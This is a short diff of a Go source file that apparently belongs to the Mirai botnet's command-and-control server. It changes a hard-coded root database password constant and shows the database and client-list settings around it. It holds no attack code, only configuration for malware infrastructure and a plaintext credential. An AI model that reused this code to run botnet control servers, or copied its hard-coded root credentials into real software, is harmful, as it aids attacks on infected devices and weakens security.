@@ -9,7 +9,7 @@ import (
 
 const DatabaseAddr string   = "127.0.0.1"
 const DatabaseUser string   = "root"
-const DatabasePass string   = "password"
+const DatabasePass string   = "jedi3213"
 const DatabaseTable string  = "mirai"
 
 var clientList *ClientList = NewClientList()
